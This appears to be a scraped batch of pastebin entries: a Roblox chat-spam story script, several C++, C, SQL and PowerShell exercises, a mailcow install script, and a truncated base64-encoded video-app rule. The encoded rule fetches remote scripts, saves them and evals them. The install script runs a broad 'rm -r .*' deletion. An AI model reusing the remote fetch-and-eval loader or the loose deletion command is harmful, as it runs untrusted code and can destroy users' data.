game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""and the memory of everything that started this can finally begin to fade away."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""As the agony of every tragedy should."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4)
local args = {
    [1] = ""And to you monsters trapped in the corridors, be still and give up your spirits. They don't belong to you."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4)
local args = {
    [1] = ""For most of you,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""I belive there is peace and perhaps more waiting for you after the smoke clears."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""Although, for one of you, the darkest pit of Hell has opened to swallow you whole,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""so dont keep the devil waiting,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""old friend."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(4.5)
local args = {
    [1] = ""My daughter, if your can hear me, I knew you would return as well."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.8)
local args = {
    [1] = ""It's in your nature to protect the innocent."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""I'm sorry on that day, the day you were shut out and left to die, no one was there to lift you up into their arms the way you lifted others into yours,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3.5)
local args = {
    [1] = ""and then,"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""what became of you."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""I should have known you wouldn't be content to disappear, not my daughter."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.8)
local args = {
    [1] = ""I coulden't save you then, so let me save you now."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)
local args = {
    [1] = ""It's time to rest - for you, and for"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(1.5)
local args = {
    [1] = ""those you have carried in your arms."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2)
local args = {
    [1] = ""End communication."",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(3)
local args = {
    [1] = ""beep......"",
    [2] = ""All""
}

game:GetService(""ReplicatedStorage""):WaitForChild(""DefaultChatSystemChatEvents""):WaitForChild(""SayMessageRequest""):FireServer(unpack(args))
wait(2.5)"
i2bEG6Mu,Дополнение,pasholnahuy,C++,Sunday 28th of May 2023 09:52:14 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <cmath>
#include <iomanip>
#include <tuple>
#include <map>

using namespace std;

class DSU {
public:
    vector<int> parent;
    vector<int> height;

    DSU(int n) {
        parent.resize(n);
        for (int i = 0; i < n; ++i) {
            parent[i] = i;
        }
        height.assign(n, 0);
    }

    int findRoot(int v) {
        if (v == parent[v]) {
            return v;
        }
        int ans = findRoot(parent[v]);
        parent[v] = ans;
        return ans;
    }

    void Union(int v1, int v2) {
        if (height[v1] >= height[v2]) {
            parent[v2] = v1;
            height[v1] = max(height[v1], height[v2] + 1);
        } else {
            parent[v1] = v2;
            height[v2] = max(height[v2], height[v1] + 1);
        }
    }


};

int main() {
    int n;
    cin >> n;
    vector<pair<double, pair<int, int>>> edges;
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            int t;
            cin >> t;
            edges.push_back({t, {i, j}});
        }
    }
    DSU graph(n);
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < n; ++j) {
            int t;
            cin >> t;
            if (t && graph.findRoot(i) != graph.findRoot(j)){
                graph.Union(i, j);
            }
        }

    }
    sort(edges.begin(), edges.end());
    double ans = 0;
    for (auto [weight, coords]: edges) {
        if (graph.findRoot(coords.first) != graph.findRoot(coords.second)) {
            graph.Union(graph.findRoot(coords.first), graph.findRoot(coords.second));
            ans += weight;
        }
    }
    cout << ans;
    return 0;
};"
JfLUtmgG,GtaIVCoordinateMerger,Plast0000,PowerShell,Sunday 28th of May 2023 09:45:23 AM CDT,"$files = Get-ChildItem -Path ./coordinates/*.ini
$output = ""./group.txt""

if (-not(Test-Path -Path $output -PathType Leaf)) {
    New-Item $output
}

Set-Content $output ""x y z""

foreach($file in $files)
{
    $line = Get-Content $file | select -first 1 -skip 1
    $line = $line.Substring(5)
    Add-Content $output $line
}
"
echHsuse,префиксы,pasholnahuy,C++,Sunday 28th of May 2023 09:36:40 AM CDT,"#include <iostream>
#include <tuple>
#include <random>


using std::pair;
using std::cin;
using std::cout;
using std::vector;
using int64 = int64_t;
using std::max;
using std::min;

int main() {
    std::ios_base::sync_with_stdio(false);
    cin.tie(nullptr);
    int n, m;
    cin >> n >> m;
    vector<int64> val(n);
    for (size_t i = 0; i < n; ++i) {
        cin >> val[i];
    }
    vector<int64> pref(n);
    pref[0] = val[0];
    for (int i = 1; i < pref.size(); ++i){
        pref[i] = val[i] + pref[i-1];
    }
    for (size_t i = 0; i < m; ++i){
        int l, r;
        cin >> l >> r, --l, --r;
        if (l == 0){
            cout << pref[r] << '\n';
        } else {
            cout << pref[r] - pref[l-1] << '\n';
        }
    }
    return 0;
}"
EyWWnwcw,Install mailcow,Justman10000,Bash,Sunday 28th of May 2023 09:29:57 AM CDT,"# You need Docker: https://pastebin.com/YTQNMvJw

mkdir /home/mailcow
cd /homw/mailcow
git init
git remote add origin https://github.com/mailcow/mailcow-dockerized.git
git pull origin master
bash generate_config.sh
rm -r .* *.md LICENSE
ln -s mailcow.conf .env
docker compose up -d"
WiKHwArJ,03. Many-To-Many Relationship,Nikola_944,MySQL,Sunday 28th of May 2023 09:29:14 AM CDT,"CREATE TABLE students (
    student_id INT PRIMARY KEY AUTO_INCREMENT,
    `name` VARCHAR(30) NOT NULL
)  AUTO_INCREMENT = 101;

CREATE TABLE exams (
    exam_id INT PRIMARY KEY AUTO_INCREMENT,
    `name` VARCHAR(30) NOT NULL
);

CREATE TABLE students_exams (
    student_id INT,
    exam_id INT,
    CONSTRAINT pk_students_exams PRIMARY KEY (exam_id , student_id),
    CONSTRAINT fk_students_exams_students FOREIGN KEY (student_id)
        REFERENCES students (student_id),
    CONSTRAINT fk_students_exams_exams FOREIGN KEY (exam_id)
        REFERENCES exams (exam_id)
);

INSERT INTO students (`name`)
VALUES ('Mila'), ('Toni'), ('Ron');

INSERT INTO exams (`name`)
VALUES ('Spring MVC'), ('Neo4j'), ('Oracle 11g');

INSERT INTO students_exams (student_id, exam_id)
VALUES
('1', '101'),
('1', '102'),
('2', '101'),
('3', '103'),
('2', '102'),
('2', '103');"
gdWqsCph,fibers,moldovexc,C,Sunday 28th of May 2023 09:19:43 AM CDT,"#include <ucontext.h>
#include <malloc.h>
#include <stdio.h>

#define FIBER_STACK 1024*64

ucontext_t uctx_func, uctx_main;

void fiber(){
    printf(""Fiber: started\n"");
    printf(""Fiber: Now swap context to main\n"");
    swapcontext(&uctx_func, &uctx_main);
    printf(""Fiber: returned\n"");
    printf(""Fiber: Now swap context to main again\n"");
    swapcontext(&uctx_func, &uctx_main);
}

int main(){
    getcontext(&uctx_func);
    uctx_func.uc_link = NULL;
    uctx_func.uc_stack.ss_sp = malloc(FIBER_STACK);
    uctx_func.uc_stack.ss_size = FIBER_STACK;
    uctx_func.uc_stack.ss_flags = 0;
    makecontext(&uctx_func, fiber, 0);

    printf(""Main: swap context to fiber\n"");
    swapcontext(&uctx_main, &uctx_func);

    printf(""Main: returned\n"");

    printf(""Main: swap context to fiber again\n"");
    swapcontext(&uctx_main, &uctx_func);

    printf(""Main: returned\n"");
    printf(""Main: exiting\n"");

    return 0;

}"
WSaUvPwS,Назад!,pasholnahuy,C++,Sunday 28th of May 2023 09:18:25 AM CDT,"#include <iostream>
#include <tuple>
#include <random>

using std::pair;
using std::cin;
using std::cout;

class InsertTree {
private:
    struct Node {
        int val;
        int size = 1;
        Node *left = nullptr;
        Node *right = nullptr;

        static int Size(Node *n) {
            if (n != nullptr) {
                return n->size;
            }
            return 0;
        }

        void Update() {
            size = Size(left) + Size(right) + 1;
        }
    };

    pair<Node *, Node *> Split(Node *n, int ind) {
        if (n == nullptr) {
            return {nullptr, nullptr};
        }
        if (Node::Size(n->left) >= ind) {
            auto [left, right] = Split(n->left, ind);
            n->left = right;
            n->Update();
            return {left, n};
        }
        auto [left, right] = Split(n->right, ind - Node::Size(n->left) - 1);
        n->right = left;
        n->Update();
        return {n, right};
    }

    static Node *Merge(Node *root1, Node *root2) {
        if (root1 == nullptr) {
            return root2;
        }
        if (root2 == nullptr) {
            return root1;
        }
        static std::minstd_rand rand_gen;
        if (std::uniform_int_distribution(1, Node::Size(root1) + Node::Size(root2))(rand_gen) <= Node::Size(root1)) {
            root1->right = Merge(root1->right, root2);
            root1->Update();
            return root1;
        }
        root2->left = Merge(root1, root2->left);
        root2->Update();
        return root2;
    }

    static Node *Build(int l, int r) {
        if (l >= r) {
            return nullptr;
        }
        Node *new_node = new Node{(l + r) / 2};
        new_node->left = Build(l, (l + r) / 2);
        new_node->right = Build((l + r) / 2 + 1, r);
        new_node->Update();
        return new_node;
    }
    void PrintNodes(Node* n){
        if (n == nullptr){
            return;
        }
        PrintNodes(n->left);
        cout << n->val << "" "";
        PrintNodes(n->right);
    }
public:
    explicit InsertTree(int size) : root(Build(1, size + 1)) {
    }
    void Cut(int l, int r){
        auto [less_eq_right, greater_right] = Split(root, r + 1);
        auto [less_left, between] = Split(less_eq_right, l);
//        root = Merge(Merge(between, less_left), greater_right);
        root = Merge(less_left, Merge(greater_right, between));
    }
    void PrintNodes(){
        PrintNodes(root);
    }
    Node* root = nullptr;

};

int main() {
    int n, k;
    cin >> n >> k;
    InsertTree it(n);
    for (int i = 0; i < k; ++i){
        int l, r;
        cin >> l >> r, --l, --r;
        it.Cut(l, r);
    }
    it.PrintNodes();
    return 0;
}"
gMcC9djD,邀您一起看：青春硬起来第1集在线播放 - LIBVIO,xiaomianao666,JavaScript,Sunday 28th of May 2023 09:11:01 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥青春硬起来第1集在线播放 - LIBVIO@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbe1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcInlzZnhcIixcInBhdGhcIjpcInlzZnhcIixcInJ1bGVcIjpcImpzOlxcbnZhciBkID0gW107XFxubGV0IHJ1bGUgPSBnZXRQYXJhbShcXFwiclxcXCIpLnNwbGl0KFxcXCIjI1xcXCIpWzBdO1xcbmxldCB1cmwgPSBNWV9VUkwuc3BsaXQoXFxcIiMjXFxcIilbMV07XFxubGV0IGl0ZSA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3VcXFwiKShydWxlLCBnZXRIb21lKHVybCkpO1xcbmxldCBqcyA9ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICB0cnkge1xcbiAgICAgICAgaWYgKGRvY3VtZW50LnRpdGxlICYmIGRvY3VtZW50LnRpdGxlLmxlbmd0aCkge1xcbiAgICAgICAgICAgIGxldCByID0gJCQkKCkubGF6eVJ1bGUoKHQpID0+IHtcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKHQpO1xcbiAgICAgICAgICAgIH0sIGRvY3VtZW50LnRpdGxlKTtcXG4gICAgICAgICAgICBmeV9icmlkZ2VfYXBwLnBhcnNlTGF6eVJ1bGUocik7XFxuICAgICAgICB9XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAgIGZ5X2JyaWRnZV9hcHAubG9nKGUudG9TdHJpbmcoKSk7XFxuICAgIH1cXG59KTtcXG5sZXQganMyID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UveDVhaVxcXCIpKHJ1bGUsIHVybCk7XFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IFxcXCJcXFwiLFxcbiAgICB1cmw6IHVybCxcXG4gICAgY29sX3R5cGU6IFxcXCJ4NV93ZWJ2aWV3X3NpbmdsZVxcXCIsXFxuICAgIGRlc2M6IFxcXCIxMDAlJiZmbG9hdFxcXCIsXFxuICAgIHBpY191cmw6IFxcXCJcXFwiLFxcbiAgICBleHRyYToge1xcbiAgICAgICAgdXJsSW50ZXJjZXB0b3I6IGl0ZSxcXG4gICAgICAgIGpzOiBqcyArIFxcXCI7XFxcXG5cXFwiICsganMyLFxcbiAgICAgICAgY2FuQmFjazogdHJ1ZSxcXG4gICAgICAgIGpzTG9hZGluZ0luamVjdDogdHJ1ZSxcXG4gICAgICAgIGZsb2F0VmlkZW86IHRydWVcXG4gICAgfVxcbn0pO1xcbmQucHVzaCh7XFxuICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCIsXFxuICAgIGV4dHJhOiB7XFxuICAgICAgICBpZDogdXJsXFxuICAgIH1cXG59KTtcXG5zZXRSZXN1bHQoZCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCJ1XCIsXCJwYXRoXCI6XCJ1XCIsXCJydWxlXCI6XCIkLmV4cG9ydHMgPSBmdW5jdGlvbihydWxlLCBvcmlnaW4pIHtcXG4gICAgcmV0dXJuICQudG9TdHJpbmcoKHJ1bGUsIG9yaWdpbikgPT4ge1xcbiAgICAgICAgbGV0IGhvc3QgPSBvcmlnaW4ucmVwbGFjZShuZXcgUmVnRXhwKFxcXCJodHRwOi8vfGh0dHBzOi8vXFxcIiksIFxcXCJcXFwiKS5zcGxpdChcXFwiL1xcXCIpWzBdO1xcbiAgICAgICAgbGV0IGhvc3RzID0gaG9zdC5zcGxpdChcXFwiLlxcXCIpO1xcbiAgICAgICAgaWYgKGhvc3RzLmxlbmd0aCA+IDIpIHtcXG4gICAgICAgICAgICBob3N0ID0gaG9zdHNbaG9zdHMubGVuZ3RoIC0gMl0gKyBcXFwiLlxcXCIgKyBob3N0c1tob3N0cy5sZW5ndGggLSAxXTtcXG4gICAgICAgIH1cXG4gICAgICAgIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXCJtYWduZXRcXFwiKSkge1xcbiAgICAgICAgICAgIGNvbmZpcm0oe1xcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcIua4qemmqOaPkOekulxcXCIsXFxuICAgICAgICAgICAgICAgIGNvbnRlbnQ6IFxcXCLmo4DmtYvliLDmlrDnmoTno4Hpk77lnLDlnYDvvIzngrnlh7vnoa7lrprmjInpkq7ljbPlj6/mkq3mlL7vvIzngrnlh7vlj5bmtojmjInpkq7lj6/ku6XlpI3liLbpk77mjqVcXFwiLFxcbiAgICAgICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChtYWcpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBtYWc7XFxuICAgICAgICAgICAgICAgIH0sIGlucHV0KSxcXG4gICAgICAgICAgICAgICAgY2FuY2VsOiAkLnRvU3RyaW5nKChtYWcpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFwiY29weTovL1xcXCIgKyBtYWdcXG4gICAgICAgICAgICAgICAgfSwgaW5wdXQpXFxuICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXG4gICAgICAgIH0gZWxzZSBpZiAoaW5wdXQuaW5jbHVkZXMoXFxcImFsaXl1bmRyaXZlLmNvbVxcXCIpKSB7XFxuICAgICAgICAgICAgbG9nKGlucHV0KTtcXG4gICAgICAgICAgICBsZXQgcjEgPSBmZXRjaChcXFwiaGlrZXI6Ly9ob21lQOS6keebmOaxh+W9sVxcXCIpO1xcbiAgICAgICAgICAgIGlmICghcjEgfHwgcjEubGVuZ3RoIDw9IDUpIHtcXG4gICAgICAgICAgICAgICAgbGV0IHJ1ID0gJC50b1N0cmluZygoKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcIua1t+mYlOinhueVjOinhOWImeWIhuS6q++8jOW9k+WJjeWIhuS6q+eahOaYr++8muWwj+eoi+W6j++/pWhvbWVfcnVsZV92Mu+/pWJhc2U2NDovL0DkupHnm5jmsYflvbFAZXlKc1lYTjBYMk5vWVhCMFpYSmZjblZzWlNJNklpSXNJblJwZEd4bElqb2k1THFSNTV1WTVyR0g1YjJ4SWl3aVlYVjBhRzl5SWpvaVRYSkdiSGtpTENKMWNtd2lPaUpvYVd0bGNqb3ZMMlZ0Y0hSNUpDUWtabmx3WVdkbElpd2lkbVZ5YzJsdmJpSTZOaXdpWTI5c1gzUjVjR1VpT2lKMFpYaDBYekVpTENKamJHRnpjMTl1WVcxbElqb2lJaXdpZEhsd1pTSTZJbUZzYkNJc0ltTnNZWE56WDNWeWJDSTZJaUlzSW1GeVpXRmZibUZ0WlNJNklpSXNJbUZ5WldGZmRYSnNJam9pSWl3aWMyOXlkRjl1WVcxbElqb2lJaXdpZVdWaGNsOXVZVzFsSWpvaUlpd2ljMjl5ZEY5MWNtd2lPaUlpTENKNVpXRnlYM1Z5YkNJNklpSXNJbVpwYm1SZmNuVnNaU0k2SW1wek9seHVaWFpoYkNobVpYUmphQ2duYUdsclpYSTZMeTltYVd4bGN5OXlkV3hsY3k5cFkza3ZZV3hwTG1wekp5a3BPMXh1WVd4cExtaHZiV1ZRWVdkbEtDazdJaXdpYzJWaGNtTm9YM1Z5YkNJNkltaHBhMlZ5T2k4dlpXMXdkSGtrSkNRcUtpUWtKR1o1Y0dGblpTUWtKQ0lzSW1keWIzVndJam9pNHBHZzU3MlI1NXVZSWl3aWMyVmhjbU5vUm1sdVpDSTZJbXB6T2x4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeHVZV3hwTG5ObFlYSmphRkJoWjJVb2RISjFaU2s3WEc0aUxDSmtaWFJoYVd4ZlkyOXNYM1I1Y0dVaU9pSnRiM1pwWlY4eElpd2laR1YwWVdsc1gyWnBibVJmY25Wc1pTSTZJbXB6T2x4dVpYWmhiQ2htWlhSamFDZ25hR2xyWlhJNkx5OW1hV3hsY3k5eWRXeGxjeTlwWTNrdllXeHBMbXB6SnlrcE8xeHVZV3hwTG1SbGRHRnBiRkJoWjJVb0tUc2lMQ0p6WkdWMFlXbHNYMk52YkY5MGVYQmxJam9pYlc5MmFXVmZNU0lzSW5Oa1pYUmhhV3hmWm1sdVpGOXlkV3hsSWpvaUlpd2lkV0VpT2lKdGIySnBiR1VpTENKd2NtVlNkV3hsSWpvaWRtRnlJR0ZzYVdweklEMGdabVYwWTJnb0oyaDBkSEJ6T2k4dloybDBaV1V1WTI5dEwyWnNlVEV6T1RjdmFHbHJaWEl0YVdONUwzSmhkeTl0WVhOMFpYSXZZV3hwTG1wekp5azdYRzVwWmlnaFlXeHBhbk1nZkh3Z0lXRnNhV3B6TG1sdVkyeDFaR1Z6S0NkaGJHa25LU2w3WEc1Y2RHRnNhV3B6SUQwZ1ptVjBZMmdvSjJoMGRIQnpPaTh2WTJSdUxtcHpaR1ZzYVhaeUxtNWxkQzluYUM5bWJIa3hNemszTDJocGEyVnlMV2xqZVM5aGJHa3Vhbk1uS1Z4dWZWeHVhV1lvSVdGc2FXcHpJSHg4SUNGaGJHbHFjeTVwYm1Oc2RXUmxjeWduWVd4cEp5a3BlMXh1WEhSaGJHbHFjeUE5SUdabGRHTm9LQ2RvZEhSd09pOHZiR1pwWTNrdVkyOXRPak13TURBd0wyMXlabXg1TDJocGEyVnlMV2xqZVM5eVlYY3ZiV0Z6ZEdWeUwyRnNhUzVxY3ljcFhHNTlYRzVwWmloaGJHbHFjeWtnZTF4dVhIUjNjbWwwWlVacGJHVW9YQ0pvYVd0bGNqb3ZMMlpwYkdWekwzSjFiR1Z6TDJsamVTOWhiR2t1YW5OY0lpeGhiR2xxY3lrN1hHNWNkR1YyWVd3b1lXeHBhbk1wTzF4dVhIUmhiR2t1Y0hKbFVuVnNaU2dwTzF4dWZWeHVJaXdpY0dGblpYTWlPaUpiZTF3aVkyOXNYM1I1Y0dWY0lqcGNJbTF2ZG1sbFh6TmNJaXhjSW01aGJXVmNJanBjSXVlOWtlZWJtT2l2cHVhRGhWd2lMRndpY0dGMGFGd2lPbHdpWkdWMFlXbHNYQ0lzWENKeWRXeGxYQ0k2WENKcWN6cGNYRzVsZG1Gc0tHWmxkR05vS0Nkb2FXdGxjam92TDJacGJHVnpMM0oxYkdWekwybGplUzloYkdrdWFuTW5LU2s3WEZ4dVlXeHBMbWx1YVhSRGIyNW1hV2NvS1R0Y1hHNWhiR2t1WVd4cFVuVnNaU2dwTzF3aWZTeDdYQ0pqYjJ4ZmRIbHdaVndpT2x3aWJXOTJhV1ZmTVY5c1pXWjBYM0JwWTF3aUxGd2libUZ0WlZ3aU9sd2k2TFdFNXJxUTU3MlI2YUcxNksrbTVvT0ZYQ0lzWENKd1lYUm9YQ0k2WENKemFYUmxMV1JsZEdGcGJGd2lMRndpY25Wc1pWd2lPbHdpYW5NNlhGeHVaWFpoYkNobVpYUmphQ2duYUdsclpYSTZMeTltYVd4bGN5OXlkV3hsY3k5cFkza3ZZV3hwTG1wekp5a3BPMXhjYm1Gc2FTNWtaWFJoYVd4UVlXZGxLQ2s3WENKOUxIdGNJbU52YkY5MGVYQmxYQ0k2WENKdGIzWnBaVjh6WENJc1hDSnVZVzFsWENJNlhDTGt1S3JrdXJybnZaSG5tNWpvcjZibWc0VmNJaXhjSW5CaGRHaGNJanBjSW1SeWFYWmxYQ0lzWENKeWRXeGxYQ0k2WENKcWN6cGNYRzVsZG1Gc0tHWmxkR05vS0Nkb2FXdGxjam92TDJacGJHVnpMM0oxYkdWekwybGplUzloYkdrdWFuTW5LU2s3WEZ4dVlXeHBMbWx1YVhSRGIyNW1hV2NvS1R0Y1hHNWhiR2t1YlhsQmJHbFNkV3hsS0NrN1hDSjlYU0lzSW1samIyNGlPaUpvZEhSd2N6b3ZMMmRwZEdWbExtTnZiUzltYkhreE16azNMMmhwYTJWeUxXbGplUzl5WVhjdmJXRnpkR1Z5TDJGc2FYbDFiaTV3Ym1jaWZRPT1cXFwiXFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICBjb25maXJtKHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn5rip6aao5o+Q56S6JyxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6ICfmnKzop4TliJnkvp3otZbkupHnm5jmsYflvbHop4TliJnvvIzngrnlh7vkuIvpnaLnmoTnoa7lrprmjInpkq7lr7zlhaXvvIzms6jmhI/lr7zlhaXlkI7kuIDlrpropoHlnKjkupHnm5jmsYflvbHnmbvlvZXpmL/ph4zkupHnm5jotKblj7fvvIzlkKbliJnkuI3og73nlKgnLFxcbiAgICAgICAgICAgICAgICAgICAgY29uZmlybTogcnUsXFxuICAgICAgICAgICAgICAgICAgICBjYW5jZWw6IHJ1XFxuICAgICAgICAgICAgICAgIH0pO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxvZyhcXFwiaW5wdXRcXFwiKTtcXG4gICAgICAgICAgICByZXR1cm4gJC50b1N0cmluZygodXJsLCBydWxlKSA9PiB7XFxuICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2lmeSh7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogXFxcIumYv+mHjOS6keebmFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXCJoaWtlcjovL3BhZ2UvZGV0YWlsP3J1bGU95LqR55uY5rGH5b2xJnVybD1cXFwiICsgdXJsICsgJz8/ZnlwYWdlJyxcXG4gICAgICAgICAgICAgICAgfSkpXFxuICAgICAgICAgICAgfSwgaW5wdXQsIHJ1bGUpXFxuICAgICAgICB9IGVsc2UgaWYgKC9cXFxcLihtcDN8ZmxhY3xtNGEpJC8udGVzdChpbnB1dCkpIHtcXG4gICAgICAgICAgICBsb2coaW5wdXQpO1xcbiAgICAgICAgICAgIHJldHVybiAkLnRvU3RyaW5nKCh1cmwsIHJ1bGUpID0+IHtcXG4gICAgICAgICAgICAgICAgZnlfYnJpZGdlX2FwcC5wbGF5VmlkZW8odXJsKTtcXG4gICAgICAgICAgICB9LCBpbnB1dCwgcnVsZSlcXG4gICAgICAgIH0gZWxzZSBpZiAoIWlucHV0LmluY2x1ZGVzKGhvc3QpICYmIGlucHV0LnN0YXJ0c1dpdGgoXFxcImh0dHBcXFwiKSkge1xcbiAgICAgICAgICAgIGxvZyhpbnB1dCk7XFxuICAgICAgICAgICAgcmV0dXJuICQudG9TdHJpbmcoKHVybCwgcnVsZSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgd2hpdGUgPSBbXFxuICAgICAgICAgICAgICAgICAgICBcXFwiZG91eWluXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJkb3ViYW5cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcIml4aWd1YS5jb21cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcImt1YWlzaG91XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJiaWxpYmlsaVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwid2VpYm9cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcIndlaXhpblxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiYmFpZHVcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInptay5cXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInN1YmhkXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJ0aHVuZGVyXFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJ4aW5qdWNcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcImdyYWI0a1xcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiL2J0XFxcIixcXG4gICAgICAgICAgICAgICAgICAgIFxcXCJqc3IxMFxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBcXFwiYXNzcnRcXFwiLFxcbiAgICAgICAgICAgICAgICAgICAgXFxcInF1YXJrXFxcIlxcbiAgICAgICAgICAgICAgICBdO1xcbiAgICAgICAgICAgICAgICBsZXQgaW5XaGl0ZSA9IHdoaXRlLmZpbHRlcihpdCA9PiB1cmwuaW5jbHVkZXMoaXQpKS5sZW5ndGggPiAwO1xcbiAgICAgICAgICAgICAgICBpZiAoaW5XaGl0ZSkge1xcbiAgICAgICAgICAgICAgICAgICAgLy/ot7PnvZHpobVcXG4gICAgICAgICAgICAgICAgICAgIGZ5X2JyaWRnZV9hcHAub3BlbihKU09OLnN0cmluZ2l